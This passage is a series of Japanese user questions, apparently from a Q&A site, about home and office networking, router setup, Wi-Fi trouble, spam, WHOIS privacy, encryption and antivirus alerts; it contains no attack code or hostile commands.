(2)XPから、ファイル名を指定：\\192.68.42.11でアクセス⇒ユーザー認証画面が出てきます。 質問 どうもNetBIOS関係のポートをWin7で開放すれば XPからつながるようなのですが、 「ポート445を空けてあげれば共有アクセスできるようになる。」 これは間違いなのでしょうか？ 普通は、XP→7の場合、7のポート445を開放すれば ファイル共有できるものなのでしょうか。 私の「137-139を開放して、445は開放しない」設定は特殊なのでしょうか？ ご教授よろしくお願いします。
ヤフーオークションでマイオークションと言うリンクがありますが、 それをクリックすると過去の私のとあるIDのマイオークションの表示になります。 ログアウトし、別IDでマイオークションをクリックしても過去のそのIDの画面になります。 別PCでは正常に当確IDで現在のマイオークションを表示し、 同じPCでも別ユーザーでなら操作は正常です。 ヤフーページのマイオークションリンクが何故そのように過去を表示するのかを 対処方法と共に教えてください。
よろしくお願いします。 今回、大阪に事務所を開設します。 部屋は賃貸でインターネット設備などは一切ありません。 部屋にはファイルサーバと、 勤怠管理のWebアプリケーションを立てる予定です。 また大阪社員の作業PCを数台設置します。 ここからがご相談ですが、 先ずは、部屋にインターネット設備を入れたいです。 ビジネス用のブロードバンド・ルータを2台購入したいと思っています。 （1台壊れると、業務が止まるので外部IPを2つ取得し、2台としたいです） その上で外部の回線を部屋に引き込み、 ルータと接続すれば、インターネットに接続できるようにしたいです。 ここまでの作業を外部に依頼する場合、 システムインテグレータさんにお願いをするのが一般的でしょうか？。 また業務上、本社（東京）の総務社員が、 大阪のこのサーバにアクセスします。 その為セキュリティも考慮したいです。 ・総務社員がブラウザで入力したデータは暗号化したい ・特定のPCや社員のみが、大阪のファイルサーバを参照できるようにしたい とする場合、「インターネットVPN」でこれは可能でしょうか？。 以上2点、お手数ですがアドバイスを 頂けると助かります。
まずこれまでの状況説明をしますと、ゲストハウスをご存知でしょうか？ 生活に必要最低限の家財が付いていてすぐ生活が出来る環境になっている賃貸物件です。 通常光熱費やネットもセットで付いていて（別料金を請求するところもある）ネットはPCを繋ぐだけで すぐに使えます。ただしメール等はフリーメールしか使えません。 で、この度そのゲストハウスを出てマンションに越したのですが、引越しが終わり工事と契約が終わり ネットをつなげようとNTT東日本の設定CDを使って設定しました。 特に問題なくネットは繋がったのですが、これまで使用していなかったoutlookexpressを開いてメールを 確認するとエラーが出ました。『HTTP サーバーで新規メッセージをポールできませんでした。 アカウント : 'Hotmail', サーバー : 'http://services.msn.com/svcs/hotmail/httpmail.as … プロトコル : HTTPMail, サーバーの応答 : '', ポート : 0, セキュリティ (SSL): なし, ソケット エラー : 12007, エラー番号 : 0x800CCC0D』 恐らくはPCの設定の問題なのは理解できますがどこをどういじればいいのかわかりません。 そしておかしいのはもう一つあってプロバイダのHPを開こうとするとなぜか開けません。 プロバイダのブロックはアダルトサイトでも問題ないレベルに解除してもらっているのですが・・・。 ブラウザを変えてやってみても同様で接続から切れてしまいます。 ちなみにクロームで開こうとすると『エラー 101 (net::ERR_CONNECTION_RESET): 接続がリセットされました。』と表示されます。色々と確認してみたのですが全て基準の設定になったままだし、 原因がわかりません。これまでゲストハウスで繋いでいた場合は発生しなかった事なので、 フレッツ接続ツールでの設定に問題があるのでしょうか？
gmailにアドレスを登録して使っていたのですが、数日前に電話番号を変更したため、認証番号の通知が受け取れなくなりました。 どうやったら今までの自分のアドレスにログインできるようになりますか？ 詳しい方、教えて下さい。助けて下さい！
現在WindowsのXPを使っていて、ネットはEMOBILEの無線ランで接続しています。が、ネットのつながりがあまりに遅くて困っています。電波はいつも三本立っているのですが・・・。 なるべく現在のパソコンを使ったままで、ネットのつながりを早くしたいのですが。何か方法はないでしょうか？ それともパソコンそのものを買い換えるしかないのでしょうか？ パソコンに詳しくなくて困っています。どうぞよろしくお願いします。
タイトルのL2スイッチにて、各ポートにMACアドレスフィルタリングの設定をしています。 e.g. ポート１には、ユニークな１台のPCしか接続できない。 この設定をした場合としなかった場合では、通信開始までの時間に相違はあるのでしょうか？ ご存知の方、または解説サイトなどあればご教示下さい。
昨年末、一度だけ「マダム・ガブリエラ」の占いを試しました。そして一度だけお金を振り込んだのですが、そのあとしつこく毎日２～３通づつのメールが送られてきて、ずっと無視していたのですが、もう50通以上にたまっていて、「迷惑です」とメールをお断りしたのですが、まったく、無視で一方的に今だにメールが来ています。ツールの迷惑メール拒否に登録しようとしても「無効」になってできません。 何が何でも毎日しつこいメールが来るので困っています。何かいい方法がないでしょうか？ どなたか教えてください。よろしくお願いします。
catalyst3560でのマルチキャストルーティングについてご教示ください。 マニュアル通り、グローバル コンフィギュレーション モードにて VLAN(SVI)にPIMバージョン、PIMモードを設定しようとすると、 弾かれてしまいます。 ルーテッドポートでは問題なく設定が行えます。 【OK】 interface FastEthernet0/7 no switchport ip address 10.112.2.1 255.255.255.0 ip pim sparse-dense-mode ! 【NG】 interface Vlan2 ip address 10.112.1.1 255.255.255.0 ! なにか問題として考えられることがあればご教示願います。
PS3でPCの動画を閲覧しているのですが（PS3 Media Server）、ネットワーク内の別のPS3や他人のPCからこのPCの動画を閲覧できてしまうのではないかと思いました。 現在のネットワーク環境は [無線コンバータ]-----[動画配信PC・PS3] | [ルータ] | -----他人のPC（ルータに有線、無線接続） PS3の設置場所が悪いのでコンバータ(MZK-SC300N2)を介して接続しています。配信PCはMacです。 現在ルータは私が管理していて、設定の変更などはできます(WHR-G300N) 無線コンバータ以下に自分専用のネットワークを構築するには、 やはりルータをもう一つ準備しないといけないのでしょうか。 ご教授のほどよろしくお願いします。
　今日、トレンドマイクロオンラインスキャンを行ったところuninstall.exeというウイルスを発見しましたと出ました。 　このプログラムに問題があるかどうか判断する方法を教えてください。また、問題だと判断された時対処する方法もあるなら指南願います。
会社で紙ベースの文書をＰＤＦ化して、それぞれに同じ開封パスワードを一括で設定したいのですが、方法がわからない為、個々に「パスワードによる暗号化」を設定して対応していますが、時間がかかり仕方がありません。有料ソフトの購入以外で何か良い方法が有れば、ご教授おねがいします。 ちなみに「Adobe Acrobat 9 Standard」は、手元にあります。
２０歳以上かとの質問に対し「はい」と回答したところ、登録有難うございました。との画面が表示されるようになり困っています。消去そる方法を教えていただきませんか。
48 Comments Only（http://userscripts.org/scripts/show/120097）をインストールしようとしたのですが、インストールボタンを押すと「プログラムの発行元を確認できませんでした」となり、インストール、保存ができません。 Windows7のExplorer9なのですが、どのようにしたらインストールできるようになりますか？ ちなみにダウンロードページにはJSファイルができますが、それを開こうとすると800A1391のエラーが出ます。 かなり困っているので回答よろしくお願いします。
パソコンにだれかから攻撃されているとか知りたいんですが調ツールありますか？あとやり返す方法とか
ウルトラWi-Fiでウイニングイレブン２０１２で仲間とマッチロビーで部屋を作って対戦しようとしたんですけど、画像のようなことが出て先に進めないんです(>_<)ウイニングイレブンをやるためにウルトラWi-Fiを買ったのに(;_;)誰か対処方法を教えて下さい(>_<)
スマートホンには、G.mailが接続（？）されています、PCはhetemlのサーバーと、lolipopの ドメインを使ったメールを使っています。 スマートホン契約の際、G.mailをいれますかと聞かれたので、G.mailはPCでもメールアドレスを登録していたので「ハイ」と答えました。 ところが、私の全く知らない間に、スマートホンと、PC（heteml)メールの交信が盗聴さｔｒていることが 判明しました。 勿論私は,両者のアドレスや、スマートホンのアドレス、暗証番号、パスワードの類は誰にも教えていません。 それは、どうも盗聴者のPCを介してG.mailの情報（？）から盗聴出来る模様と思われます。 宜しく御助けください。
社内SEをしておりますが、他部署からJuniper M7i（JUNOS8.6?）を譲り受けました。 しかしながら、user名は分っているのですがPWが分らずログインできない状況です。 困った事に、しばらく使っていなかったので、元の部署のメンバーも誰も知らないようです。 色々インターネットで調べると、起動時に"Loading /boot/defaults/loader.conf" メッセージが 表示された時にスペースキーを押し、ローダプロンプトで boot -s を入力するとシングルユーザ モードで起動でき、そこで root のパスワード変更が出来るようですが、boot -s を入力しても しばらくすると root のパスワード入力を求められ、シングルユーザモードでログインできず パスワードリカバリができません。 お手数ですが、どのようにしたらパスワードリカバリが出来るかご教授願います。
パソコン初心者です。 ウィンドウズ７です。 パソコン起動した直後に『ユーザーアカウント制御』で,真ん中に『不明』という文字がある画面が出てきました。何も確認せずに特に意識もなく『いいえ』を押しました。しかし『いいえ』を押したかどうか自信が持てません。 (1)もし『はい』を押していた場合,その後インストール画面など出てきますか？ (2)またどこかに更新履歴が残っていますか？？発行元が不明の場合を許可したら,ハッカーなどの危険性があるとのことで不安です。 ※無線ランに接続中のときにこの制御画面が出てきて,接続に失敗しました。(その後,再度接続したらできました。)ネット接続となにか関連があるのでしょうか？ セキュリティ面がとても不安です。よろしくお願いいたします。
ある日突然ネット回線が定期的に途切れてしまうようになってしまいました どうしたらいいでしょうか マンションタイプ光の有線なんですが ある日突然途切れるようになってしまいました １０秒ぐらい切断され ２～３分ぐらい接続する というのをずっと繰り返してます 多分原因はひとつのルーターで４つのｐｃに接続してるからだと思うのですが（最大４つまで有線LANが繋げれるルーター） LANケーブルの損傷　接続機器の損傷ではないと思われます（買い換えたばっかなので） ちなみにWindows7の32bitです 前は普通にその状態でも快適にネットをできたのですが 突然このような事態になってしまいました ※他の３つのｐｃは正常にネットが接続できているみたいです 自分のｐｃだけが定期的に途切れてしまいます ご回答よろしくおねがいします
大変漠然とした質問で、申し訳ないのですが、インターネット上のセキュ リティで使われている暗号について、今回お聞きしたく問い合わせを致 します。一般論でも、結構ですから教えていただきたく思います。 私も、ショッピングをインターネットのウェブページ上から行うことが以前 より頻度が多くなり、その際クレジットカードの番号を入力して決済を行 っています。当然、番号を盗まれ、クレジットカードを偽造され、悪用され る危険性も以前より増したと感じるようになってきました。 当然、習慣として、カード決済を行うと、定期的に、金融機関の口座残高 をチェックするように心がけるようにはなりました。このような理由からも 、今日インターネット上で使われていると思われる暗号について、お聞き したくなりました。 何点か質問させてください。 クレジットカードでの決済を、ウェブページ上で行う場合、このウェブペ ージの管理者、ここでは、業者、企業なのでしょうが、クレジットカード の番号を入力する際などに、他者に盗み見られないに、ウェブページ に暗号をかけている事も多くなってきたと聞きます。このシステムは標 準化されてきているのでしょうか? きちんとした業者の場合は、暗号を かけている事が多いと言った話は聞きのですが、現状はどのなのでし ょうか? 私は、シマンテック社のウィルス、セキュリティソフト、Noton 360を使用 しているのですが、こう言ったソフトでも、最初の質問の場合のように、 クレジットカードの番号を入力してショッピング決済したり、ユーザーID やパスワードを入力する際に、ウェブページに暗号をかける事が出来 るソフトなのでしょうか? それとも十分ではないのでしょうか? またキーロガーのような、トロイの木馬タイプのソフトが、もしインストー ルされた場合、Noton 360のようなセキュリティソフトでも、クレジットカー ドの番号やネットバンキングのユーザーIDやパスワードの盗み取りを 防ぐことは可能なのでしょうか? 最近、量子暗号に関したテレビ番組を見ました。ここ数年の間に、PC のCPUの性能が著しくアップし、またそれに伴いスーパーコンピュータ の性能も目まぐるしく向上したため、従来パソコンに使用されていた暗 号でも、暗号が破られる危険性が出てきたため、今の時点では、スー パーコンピューター京を使っても解読が無理だ、いや完全に無理だと 言われている量子暗号の開発、実用化が進められていると聞きます。 実際、スイスの選挙では、量子暗号が、世界で初めて使われたとも聞 きます。 前置きが、長くなりましたが、一番目、二番目、三番目の質問でも出し ました。ウェブページ上、ウィルス、セキュリティソフト上で、現在使わ れている暗号、あるいは暗号化は、数百桁の数同士の因数を掛け合 わせる事が基本となっているのと聞きます。本当に、数百桁の数、あ るいは数千桁の数を因数分解しないと、暗号を解読出来ないような仕 組みになっているのでしょうか? 暗号については、全く知らないと言ってもいいくらいのレベルです。今 回、なんかまとまりがない質問になってしまったようで、質問の意図を うまくお伝え出来たか、不安な気持ちです。よろしくお願い致します。
東日本大震災から１年近くが経過しました。 みなさんは日本の無線通信の技術的な問題や防災無線のシステムについてどう思われますか？ ここを改善するべきだなどの意見が聞きたいです
WiFi付きケータイ電話は、音声通話を中心に画像・データ等のマルチメディア情報も可能にする移動体通信技術とブロードバンドデータ通信を可能にする無線LAN技術をベースに開発されたとある方の論文に記載されていました WiFi付きケータイ電話においてベースとなる移動体通信技術と無線LAN技術の物理層での違いってなんですか？ 詳しい方お答え頂けないでしょうか？お願いします
ｐ２ｐで映像の送受信を行うのですが、ＣＯＤＥＣがＩＰアドレス決め打ちで、映像を送信しているのですが、この場合、ＷＡＮでもセキュリティは確保できているという考えでもいいのでしょうか？ 念のため、ＶＰＮルーターなどを使うのが無難なのでしょうか？
AppleID を作成するときにでる、＜セキュリティコード＞ってなんですか？ ちなみに、カード番号と同じものを入力すると＜クレジットカード確認番号箇所の入力情報が正しくありません＞と、でてきたのですがどうすればいいのですか？おしえてください。
Microsoft Security Essentialsの日本語のダウンロードは出来ないでしょうか。 そもそも存在してないのでしょうか。
ネット盗聴されていると確信しているのですが、警察にPCを提出するまでの一連の手続きをPC業者に頼んでやってもらえるのでしょうか？教えてください。
CG-WLR300NNH無線ルータ経由でCATVのインターネットに接続しています。 (1)LANコネクタ直結のVista　PC　(2)内臓無線LANのVista　PC　(3)CG-WLUSBNM接続のXP　PCの合計3台は正常にインターネット出来るのですが、 CG-WLUSBNM接続のXP　PCの1台が、インターネットに接続できなくなりました。 ワイヤレスネットワークの接続の状態を確認すると、CG-WLR300NNHへの接続はできるが、 WAN側へは接続できないようです。 ネットワークの接続を修復すると、下記のダイアログが表示されます。 　　次の操作を完了できないため、問題の修復を完了できませんでした 　　ワイヤレスネットワークへの接続 　　詳細はネットワーク管理者へ問い合わせてください。 また、Internet　Exploｒerで「接続の問題を診断」すると、 　　次の複数層サービス　プロバイダ（LSP)に問題があることが検出されました　PCTools 　　SGLSP 　　このLSPを削除しますか？ で、はいを選んで次へ進むと、　 　　問題が発生したため、Network Diagnostic for Windows XPを終了します。ご 　　不便をおかけして申し訳ありません。 となり、削除はできません。 今から思うと、余計なプログラムをアンインストールして、整理していたのが、 原因かと思われますが、 SGLSPとは、どんなもので、不要ならどうやって削除するのかを教えていただきたく お願い申し上げます。 なお、セキュリティ プログラムを停止したり、スタートアップを全て停止させて 確認をしましたが、接続はできませんでした。
携帯メールの私と、携帯＆パソコンメールの彼氏の内容が、他人に漏れる(知られる)事はあり得ますか？ 現実にあったんですけど…。
いきなりNICがトラブル。 ifconfigなど全ての設定を見直ししましたが設定に問題は無い。 問題はRXが０のままである。TXは作動している。ifconfigで確認。 これはハードのエラーでしょうか？ソフト的に問題があると思いますか？
バッファローの無線LAN　エアステーションを使っています。 で、セキュリティがしっかりされているか確認したいのですけども、一目でわかる方法ありますか？ 無線LAN親機のランプがついているところを見て一目でわかる場所ありますか？ あったとしたら、どんな状態だったらどうなのかも教えてください。 回答おまちしています。
DSブラウザーでインターネットに接続しているところなのですが、WEPキー？というのを入力しても「入力内容が正しくありません」と表示されます・・・ 最後の二桁を除いて入力すると接続テストができたのですがテストの結果は「IPアドレスを取得できません」と表示されます・・・ なにがいけないんでしょうか？ インターネットのことはよく分からないので分かりやすくお願いします・・・
会社でネットをする際に、会社から指定されたプロキシサーバのアドレスをブラウザ（ＩＥ８）に設定してネットにつないでいます。 ※会社が指定するプロキシサーバはたぶん（ＬＡＮ）にあります。 このプロキシサーバを経由させないとネットに繋がらないのですが、このプロクシサーバから さらに自分の指定したプロキシサーバ（ネット上の）等を経由させるにはどこに設定すればよいですか？ ブラウザに２つも設定できないですよね？ やりたいことは 【現状】 ブラウザ　→　会社が指定するプロキシサーバ（ブラウザに設定）　→　ネット を 【プロキシ２重経由】 ブラウザ　→　会社が指定するプロキシサーバ→　自分が指定するプロキシサーバ（ＷＡＮ上の）　→　ネット にしたいです。 できませんかね？よろしくお願いします。
cisco社ルータの設定をおこなっていますが、うまくいかず困っています。知識不足から原因を特定できずいます。 ルーターはヤフーオークションで購入しました。 「config terminal」のコマンドを打つと下記のメッセージが表示され、特権モードに移れません。 Enter configuration commands, one per line. Edit with DELETE, CTRL/W, and CTRL/U; end with CTRL/Z 又、IOSのファイルめいが「igs-i-L.111-13a」です。 たしかIOSファイルは********.binだと思ったのですが。 よく調べてヤフオクで購入するべきでした。 どなたかご教授をお願いたします。
Windowsファイアウォールを使用しています。 このファイアウォールでは、「例外」として、特定のプログラムやポートを 「開放する」という設定ができますが、逆に特定のポートを「遮断する」ことは できないのでしょうか。 あるプログラムを使用しており、このプログラムをWindowsファイアウォールの 例外に設定してあります。 このプログラムは複数のポート（使用ポートは固定のもの１つと、不定のものが１つ以上）を 使用しています。 このうち、固定ポートだけを遮断したいのです。 「例外としてこのプログラムの使用するポートは開放するけど、更に例外として○○番ポートだけは遮断してね」 という設定をしたいのですが、Windowsファイアウォールで可能ですか？ あるいは、何か別のファイアウォールソフトを使用する必要がありますか？ ご存知の方いましたら、お願い致します。
PCの履歴から、パスワードつきのサイトや、ログインしたあとのmyページ等にもいけるんでしょうか。 履歴消し忘れたんで、気になってます。 カテ違いだったら、ごめんなさい。。
セキュリティや暗号化等について、詳しい方がいらっしゃいましたらご教示ください。 最近、クラウドサービスが流行っております。 私も例に洩れず、DropboxやEvernote等を利用させていただいております。 そこへファイルを置こうと思った時に、物によってはパスワードを付けたほうが良い場合もあると思います。 例えば、連絡帳や家族の写真等です。 そもそも見られたら困る物をおいて置くつもりはありませんが、 そうでない物だとしても、サービスの不具合等によって流出してしまったりすれば気分の良いものではございません。 そのため、あまり使う機会のないファイルはパスワードを付けてから置いておこうと考えております。 しかし、パスワード付ZIPファイルは簡単に解読出来てしまうという話を聞いたことがあります。 そこで「WinRAR」にて、日本語でパスワードを付けられるということを最近知りました。 ZIPと違い、さらに日本語パスワードならそう簡単に解読できないと思うのですが、 このセキュリティはどの程度、安心できるものなのでしょうか。 なおパソコンについては、事務作業程度の知識しか持ちあわせておりません。 多少正確でなくても構いませんので、可能な限り分かりやすくご説明願いますと助かります。 どうぞよろしくお願いいたします。
会社にてある人に、ネットワークを経由して相手のPCにアクセス出来ると言われ、 実際に私のPCからその人のPCにアクセスし、データを私のPCに頂きました。 【質問(1)】 この相手のPCにアクセス出来る、というのは、ネットワークのファイル共有設定がされているため出来るのでしょうか。 つまり下記URLの設定を行えばアクセス出来るのか、ということなのですが。 http://support.microsoft.com/kb/2485635/ja 私としては勝手に自分のPCにアクセスされるのは好ましいとは思わないため、 アクセス出来ないようにしておきたいと思っています。 【質問(2)】 ファイル共有設定をしない設定のみでネットワーク上から勝手にアクセスされることはなくなるのでしょうか。 あまりネットワークに詳しくないため、教えて頂けると助かります。 どうぞよろしくお願い致します。
メールアドレスがSMTP認証時のユーザ名となっていて、 メールを送信する際、そのメールの送信元アドレスが SMTP認証時のユーザ名と同一でなければメールの送信が 行えないISPがあるようです。 いわゆるなりすましメール対策には有効な機能だと 思うのですが、この機能をpostfixやsendmailと言った Linuxベースのメールサーバで実現する事は可能なのでしょうか？ 可能な場合、具体的にはどのようなソフトウェアを 用いて実現するのでしょうか？
新しくFMVF56DDRGというPCを買ったんですが 使い始めたころから接続がよく切れるようになりました １台しか使ってない時は何の問題もないのですが２台同時に使うとそうなってしまうようです 切れるときは２台とも同時です。コード等を全部抜いて時間をおいて再度刺しても直りませんでした 切れると「Internet Explorer ではこのページは表示できません」と表示されます 接続が切れても勝手に十数秒ほどで直るんですが色々不便なのでどうにかなりませんかね？ ちなみにどちらも有線接続してます
お世話になります。 ルータのパケットフィルタリングについて教えてください。 『現在、Wimaxのルータ（NEC製）をPCにLANケーブルで接続し、ネット接続しています。 （WimaxのルータはADSLの一般的なルータとほぼ同じような機能を持っています。） 接続しているPCでコマンドプロンプトを開き、netstatを行ったところ、TCPの１３５や１３９や４４５といったポートがlisteningになっています。ルータでは特にパケットフィルタリングの設定をしていません。』 という、この場合の話なのですが、これは危ないのでしょうか？ ＴＣＰの１３５などが危険なポートだということは理解しています。 listeningをしているということは、口をあけている状態ですのでＰＣが接続される状態だということもわかっています。 ですが、ルータがあるので大丈夫ではないかと思ってしまうのです。つまり、ルータのパケットフィルタリングの設定を変更して外から１３５等が入ってこないようにしなくてもよい気がするのですが、実際はどうなのでしょうか？ やっぱり、デフォルトでlisteningしている怪しげなポートはひとつずつルータで指定して閉じないといけないのでしょうか？ アドバイスをよろしくお願いします。
会社とかで公開している問い合わせ用の代表メールアドレスは、個人情報に入りますか？ お客様や利用者などからの問い合わせを受け付けるために使用している場合、公開されていれば個人情報とは見なさないと思うのですが。 たとえば、代表アドレスの＠前の名称が会社名であっても、受け取った会社側で利用する方が、個人商店の代表者として実際１人しかいなければ、その代表者にとっての個人用のメールアドレスと同じ扱いになると考えています。 会社で使用している代表メールは、個人情報か否かの境目は何で決まるのでしょうか。
こんばんは。 自分の携帯電話の個体識別番号で検索すると、以前レスした掲示板(2ch)のスレッドがヒットしました。 そのスレッドの他のレス者は個体識別番号が表示されていないのに、自分が書いたレスだけ表示されていました。 確かレスした時は表示されていないかった筈…。 何故だか分かる方、教えて頂きたいです。
クライアントPCはWinXPです（今後Win7に変わる予定です） 例えば、ローカルアカウント「TEST」（管理者権限あり）でPCを設定したとします。 そののち、ドメインアカウント「ADUSER1」でActiveDirectoryに参加します。 その際に、ローカルアカウント「TEST」を無効化したいのですが、 ADポリシーで実施可能でしょうか。 どうぞよろしくお願いいたします。
先日、 http://oshiete.goo.ne.jp/qa/7198619.html にて、質問させていただきました。 暗号化＋デジタル署名したファイルをメールで相手に送ってみたところ、 そのメールを本人が送ったのか確認できないため、ダメでした。 相手にフィンガープリントを送るだけでは不十分ということですが 完全に行き詰ってしまいした。 暗号化したメールを送ってみればいいのでしょうか？ ところで、 テキストファイルを暗号＋署名して、その本文をメールに貼りつける方法をとっているのですが 暗号化したメールはどのようにして複合すればいいのでしょうか？ 暗号化したメールを送っても、送った本人かどうかの確認はどこで行うのでしょうか？ 教えて下さい。よろしくお願いします。
質問があります。独自ドメイン取得でWHOIS対策 のほうはどうなのかといろいろと調べております。 独自ドメインで個人情報が漏れない(安全性の高さ) ではさくらインターネットがいいのではないかという 結論です。というのも、名前は任意で住所電話は さくらのほうが記載されるからです。 で、さくらのサーバーを借りたときに入手できる 初期ドメインというものがありますよね。 XXXXX.sakura.ne.jpというものです。 試に現在利用中のXXXXX.sakura.ne.jpをWHOIS で検索してみたら、データそのものが表示されません。 ということは、独自ドメインなどを入手などせず、 個人情報の観点から初期ドメインのアドレスだけを 使っていればいいのかなーと。 実際、このXXXXX.sakura.ne.jpの初期ドメインが WHOISに検索されないというのはどういうシステム なのですか?また、初期ドメインが検索される (個人情報が公開)される可能性はあるのですか?
PCは、Fujitsu NH28D、OSはXP　Pro、内臓無線LANでbroadcomのドライバーソフトを使用しています。過去にNTTのWeb Caster V110ワイヤレスセットとの通信をしていましたが、新しくひかり電話ルータ RV-440NEと無線LANカードSC-40NEに変更したところ、利用できるネットワークに自分のSSIDが表示されません。他のSSIDは表示されています。 また、別の２台のPCでは、目的とするSSIDが見えていて、一台はXP　Pro、内臓の無線LANと、もう一台はXP　Home、無線LANカードSC-３２での接続で、開通しています。 アクセスポイントのステルス設定は、外しています。また、手動で、ウィンドウズ側のワイヤレスネットワークのプロパティー画面でも、broudcomのアプリ側の設定からでもSSIDを追加しても、変わりません。
一般に売られているブロードバンドのルーターで 異なるネットワーク間での接続ができるような環境を作りたいと思っています。 下記のような感じです。 [ネットワークA] ●ルーターA ネットワークアドレス：192.168.0.0 サブネットワークアドレス：255.255.255.0 デフォルトゲートウェイ：192.168.0.1 ●ルーターA配下の端末 端末A-1：192.168.0.2 端末A-2：192.168.0.3 [ネットワークB] ●ルーターB ネットワークアドレス：192.168.1.0 サブネットワークアドレス：255.255.255.0 デフォルトゲートウェイ：192.168.1.1 ●ルーターB配下の端末 端末B-1：192.168.1.2 端末B-2：192.168.1.3 この場合 端末AからBへpingが通るための環境を作ることは可能でしょうか？ 可能であればルーター通しをどのように接続し、設定すればよろしいでしょうか？ wanを超えるとどうしてもwan以下のPCへpingを飛ばすことができませんでした。 例えば 端末A-1から「ping 192.168.1.3」で応答があるような環境が作りたいです。 どうぞご教授お願いいたします。
アメリカのような国でGSM通信技術を使っていますが、日本は無線通信領域でなんの通信技術をつかていますか？ 誰がご存知ですか？ 教えていただけないでしょうか？
OSは　XP pro です。コントロールパネル→ネットワークとインターネット接続→ネットワーク接続　でワイヤレス接続のアイコンが表示されなくなってしまいました。ローカルエリアと１３９４接続は表示されています。
質問です。今回、wordpressにてブログを作成しようと 思い、独自ドメインとサーバーについて調べています。 ブログのほうは私個人の趣味的な内容ですが、独自ドメイン 取得で個人情報を流したくありません。サーバーは ロリポップとsakuraインターネットを比較検討中です。 で、ロリポップの独自ドメインですが、取得後にwhois の非公開設定ができるようですが、どうも不安なので、 住所電話は正確に書いてペンネームで登録しようかとも。 或いは、sakuraインターネットなどでサーバーだけ 申し込めば初期ドメインが********.sakura.ne.jpと なりますよね。独自ドメインさえ使わなければwhoisを 回避できるのであれば、これでもいいのかと。 お金を払えば匿名のドメインが入手できるのは分かり ますが、コストの面でロリポップとsakuraのどちらかに しようと思っています。 普通のブログなら問題ないのですが、wordpressということ で、新たな問題になっています。なにかよい解決法を 教えてください。宜しくお願いします。
授業で課題を出されて 相手が自分の公開鍵を正しく持っていることを確認、証明したいんです 何をどうすればいいのかさっぱりです 調べたらPKIとか証明書を発行するやり方が出てきましたが それしか方法はないのでしょうか?? 授業ではクレオパトラを使って公開鍵を作りました。 詳しい方おられたら教えてください よろしくお願いしますm(_ _)m
急に数台のノートパソコン（無線ＬＡＮ）が社内ネットワークに繋がらなくなりました。 インターネットには繋がるので、無線の設定は大丈夫なんだと思います。 無線をＯＦＦにして有線でつなぐと、インターネットも社内ネットワークも繋がります。 ＯＳはＸＰと７です。 普通に使えているノートパソコンもあります。 何が原因として考えられるでしょうか？
既に投稿している内容を改めて質問します。 SKYPEにログインすると通信が重くなるため、詳しくないながらもWiresharkで通信の内容を確認しました。 SKYPEでプライバシー設定を行いコンタクト共有している人と通信できるようにしていますが、その人数は3人です。それにも関わらずログインすると自分のPCから無数の通信が開始され、その後無数の接続が確立します。 ウィルスソフトで自身のPCのチェックを行いましたが感染はしていません。 SKYPEのみを立ち上げた時のSKYPEログイン直後の通信の抜粋を添付します。 一部を自分でファイアーウォールで双方向ブロックしてみましたが絶え間なく通信が発生し、SKYPEで落ち着いて話もできず、SKYPEを起動しているときは他のサイトを立ち上げるのに非常に時間が掛かり、複数サイトを立ち上げると通信が途切れます。 SKYPEを毎日使用する用事があるため本当に困っています。 SKYPEにほぼ上記の通りメールで問い合わせましたが 「Skypeが必要とする帯域幅は、通話のタイプによって異なります。 Skypeが必要とする通話別の帯域幅の一覧については、次のFAQをご覧ください。 …。」という回答でした。 帯域についてではなく、添付ファイルのように無数の通信が開始されるのは異常ではないのか？　異常であれば何故無数の通信が開始されてしまうのか？　どうしたらいいのか？ということを教えて頂きたいと思っています。 知識のある方、アドバイスをお願いします。よろしくお願いします。
SKYPEにログインすると通信が重くなるため、詳しくないながらもWiresharkで通信の内容を確認しました。 SKYPEでプライバシー設定を行いコンタクト共有している人と通信できるようにしていますが、その人数は3人です。それにも関わらずログインすると自分のPCから無数の通信が開始されます。 ウィルスソフトで自身のPCのチェックを行いましたが感染はしていません。 SKYPEのみを立ち上げた時のSKYPEログイン直後の通信の抜粋を添付します。 一部を自分でファイアーウォールで双方向ブロックしてみましたが絶え間なく通信が発生し、SKYPEで落ち着いて話もできず、SKYPEを起動しているときは他のサイトを立ち上げるのに非常に時間が掛かり、複数サイトを立ち上げると通信が途切れます。 SKYPEを毎日使用する用事があるため本当に困っています。 SKYPEにほぼ上記の通りメールで問い合わせましたが 「通話で問題が発生しているとのこと、申し訳ございません。 Skypeが必要とする帯域幅は、通話のタイプによって異なります。 Skypeが必要とする通話別の帯域幅の一覧については、次のFAQをご覧ください。 https://support.skype.com/faq/FA1417」という回答でした。 再度問い合わせ中ですが、明快な回答をもらえるか不安を感じこちらにも投稿することにしました。 よろしくお願いします。 尚、この問題は最初は状況が掴めず「不正と思われるアクセスがたくさんある時は？」というタイトルで一度質問しました。併せて目を通して頂けると嬉しいです。 対処方法をお教えください。よろしくお願いします。
今まで、そのサイトにアクセスしても何もなかったのですが、先日、そのサイトにアクセスすると、 ウイルスバスターのリアルタイム検索でウイルスが引っ掛かったみたいです。 何回かアクセスしなおしても毎回出ました。 少し文字の位置とかがおかしかったりしていました。 ネットを閉じてセキュリティーレポートを見ると、「ウイルス/脅威 Mal_Hifrm-2」、感染源「不正プログラム」、影響を受けるファイル「C:¥Users¥T\AppData¥Local¥Microsoft¥Windows¥Temporary Internet Files～」、処理「アクセスが拒否されました」検索の種類「リアルタイム検索」とあります。 その後、コンピューター全体の総合検索をしてもウイルスは検出されないし、影響を受けるファイルを探したのですが、そのようなファイルは見当たりません。ウイルスのある場所が表示されないのでそのウイルスがどうなったのかがわかりません。 ウイルスはどこに行ったのでしょうか。とりあえず、ウイルスはもういないと思っていいのでしょうか。 OSはVista でウイルスバスターの2012を使っています。 今はそのサイトにアクセスしても、文字の位置とかももどっていますし、何も出なくなりました。
例えば社内LANのIPアドレスが192.168.1.XXXだとして 私用のパソコンを社内LAN環境に侵入させない方法はあるのでしょうか？ Ｓｅｒｖｅｒ　ＯＳはWindows Server 2008です。
